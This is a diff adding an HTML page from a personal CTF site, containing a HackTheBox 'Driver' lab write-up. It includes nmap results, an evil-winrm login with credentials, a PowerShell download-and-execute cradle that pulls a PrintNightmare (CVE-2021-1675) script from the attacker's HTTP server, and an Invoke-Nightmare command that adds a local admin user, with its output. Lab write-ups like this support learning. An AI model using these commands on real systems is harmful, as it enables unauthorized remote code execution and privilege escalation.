@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+	<meta charset="UTF-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE-edge" />
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
+	<title>test</title>
+	<link rel="stylesheet" href="../../../css/style.css" />
+	<style>
+		h1 {
+			color: #00ff00;
+			/* change the color of the main heading */
+		}
+
+		h3 {
+			color: #ff00ff;
+			/* change the color of the subheadings */
+		}
+
+		a {
+			color: #ffffff;
+			/* change the color of the links */
+			text-decoration: none;
+			/* remove underlines from links */
+		}
+	</style>
+</head>
+<body>
+	<header class="writeups">
+		<h1 class="neon textHeading">Writeups - Notes - CTF's</h1>
+			<h3 class="links2-custom">
+				·
+				<a href="https://twitter.com/AnonHack3r" class="custom-link2">Twitter</a>
+				·
+				<a href="https://www.youtube.com/@AnonHack3r_1337" class="custom-link2">YouTube</a>
+				·
+				<a href="https://app.hackthebox.com/profile/480696" class="custom-link2">AnonHack3r</a>
+				·
+			</h3>
+	</header>
+	
+	<main class="topics-container">
+		<div >
+			<p>
+				<h1 class="custom-heading neon" data-value="HackTheBox Writeups">HackTheBox Writeups</h1>
+			</p>
+		</div>
+
+		<div class="writeupNotes">
+			<p><img src="PWND/Driver.png" alt="image"></p>
+<p>#Masscan - Nmap </p>
+<div style="text-align: left; font-size: medium;">
+80/tcp  open  http         Microsoft IIS httpd 10.0
+| http-auth: 
+| HTTP/1.1 401 Unauthorized\x0D
+|_  Basic realm=MFP Firmware Update Center. Please enter password for admin
+| http-methods: 
+|   Supported Methods: OPTIONS TRACE GET HEAD POST
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Site doesn&#39;t have a title (text/html; charset=UTF-8).<br><br>
+135/tcp open  msrpc        Microsoft Windows RPC<br><br>
+445/tcp open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)<br><br>
+Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows<br><br>
+Host script results:<br><br>
+|_clock-skew: mean: 7h14m09s, deviation: 0s, median: 7h14m09s
+| smb-security-mode: 
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2021-10-12T06:28:40
+|_  start_date: 2021-10-11T22:46:25<br><br>
+SMB RELAY ATTACK
+</div>
+<h1 id="enumeration">Enumeration</h1>
+<p>using evil-winrm -i 10.10.11.106 -u tony -p liltony </p>
+<p>we got a shell as tony 
+using upload /opt/<path2linumWin>
+we noticed print spoolesv running </p>
+<p>so we can do print nightmare. 
+/opt/windows/&lt;printnightmare.</p>
+<p>cd into printnightmare dir and set up a python server on any port. 
+python3 -m http.server 8998</p>
+<p>while you are loged into evil-winrm </p>
+<p>using this download method will inport the module atomatically, i tried to add it on my own and it gave scripts error. </p>
+<p>IEX(New-Object Net.Webclient).downloadstring(&#39;<a href="http://10.10.14.2:8998/CVE-2021-1675.ps1&#39;">http://10.10.14.2:8998/CVE-2021-1675.ps1&#39;</a>)</p>
+<p>once you download the file..</p>
+<p>[0;31m<em>Evil-WinRM</em>[0m[0;1;33m PS [0mC:\temp\test\v&gt; Invoke-Nightmare -NewUser &quot;AnonHack3r&quot; -NewPassword &quot;PwndByAnonHack3r&quot;
+[+] created payload at C:\Users\tony\AppData\Local\Temp\nightmare.dll
+[+] using pDriverPath = &quot;C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_f66d9eed7e835e97\Amd64\mxdwdrv.dll&quot;
+[+] added user AnonHack3r as local administrator
+[+] deleting payload from C:\Users\tony\AppData\Local\Temp\nightmare.dll
+[0;31m<em>Evil-WinRM</em>[0m[0;1;33m PS [0mC:\temp\test\v&gt; net user</p>
+<h1 id="privesc">PrivEsc</h1>
+<p>  use evil winrm and log into AnonHack3r account </p>
+<p>  net user Anonhack3r </p>
+<p>  you are Admin. </p>
+		</div>
+		<div class="container">
+			<div class="terminal-box">
+				<div class="terminal-body">
+					<div style="text-align: center;"></div>
+					<img src="../../../example.svg" class="example-svg">
+					<div class="space">
+						<p></p>
+					</div>
+					<div style="display: flex; flex-direction: column; align-items: center;">
+						<p class="command-text"><br>For a list of the commands, type<br>
+							<span class="help-txt">"help"</span>
+						</p>
+						<div
+							<div class="cursor">
+								<input id="text" class="txt-input" placeholder="Type something..." autocapitalize="off"
+									autocorrect="off" inputmode="text">
+								<p></p>
+								<i></i>
+							</div>
+						</div>
+					</div>
+					<div class="content"></div>
+				</div>
+			</div>
+		</div>
+		<div class="badge">
+			<!-- BADGES -->
+			<p>
+				<img src="https://img.shields.io/github/last-commit/AnonHack3r1337/CTF?color=red&style=flat-square">
+				<!-- BADGES -->
+			</p>
+		</div>
+		
+	</main>
+
+	<footer class="footerWithContact">
+		<div class="contactMe">
+			<!-- Footer content here -->
+			<p>Contact Me
+				
+			</p>
+		</div>
+		<div >
+			<p>
+			<a href="https://twitter.com/AnonHack3r" class="DM">
+			<span>
+				Direct Message on Twitter
+			</span>
+			</a>
+			</p>
+			<p></p>
+		</div>
+		<p></p>
+	</footer>
+
+	<script src="../../../js/main.js"></script>
+</body>
+
+</html>
